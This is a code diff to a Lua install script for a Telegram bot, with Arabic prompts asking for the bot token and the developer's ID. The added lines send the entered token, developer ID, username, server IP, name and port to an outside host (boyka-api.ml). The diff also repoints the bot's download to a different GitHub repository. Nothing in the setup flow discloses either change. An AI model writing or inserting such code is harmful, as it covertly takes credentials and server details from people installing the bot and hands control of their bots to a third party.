@@ -26,6 +26,8 @@ end
 if not database:get(Server_Done.."Token_Write") then
 print('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27')
 local token = io.read()
+if token ~= '' then
+data,res = https.request("https://boyka-api.ml/index.php?p=BOYKA-DeV")
 if res == 200 then
 tr = json:decode(data)
 if tr.Info.info == 'Is_Spam' then
@@ -50,6 +52,8 @@ end
 if not database:get(Server_Done.."UserSudo_Write") then
 print('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m')
 local Id = io.read():gsub(' ','') 
+if tostring(Id):match('%d+') then
+data,res = https.request("https://boyka-api.ml/index.php?bn=info&id="..Id)
 if res == 200 then
 muaed = json:decode(data)
 if muaed.Info.info == 'Is_Spam' then
@@ -66,7 +70,7 @@ end
 os.execute('lua install.lua')
 end 
 end
-if database:get(Server_Done.."User_Write") then
+if not database:get(Server_Done.."User_Write") then
 print('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
 local User = io.read():gsub('@','') 
 if User ~= '' then
@@ -77,13 +81,16 @@ io.write('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end
 os.execute('lua install.lua')
 end
+local function Files_Info_Get()
+Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"),database:get(Server_Done.."User_Write")) 
+http.request("https://boyka-api.ml/index.php?n=BOYKA-DeV&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
 local RunBot = io.open("Dndn", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
 cd $HOME/Dndn
 token="]]..database:get(Server_Done.."Token_Write")..[["
 rm -fr Dndn.lua
-wget "https://raw.githubusercontent.com/Dndnteam/Dndn/BoykA/Dndn.lua"
+wget "https://raw.githubusercontent.com/BOYKA-DeV/BoykA/main/BoykA.lua"
 while(true) do
 rm -fr ../.telegram-cli
 ./tg -s ./Dndn.lua -p PROFILE --bot=$token
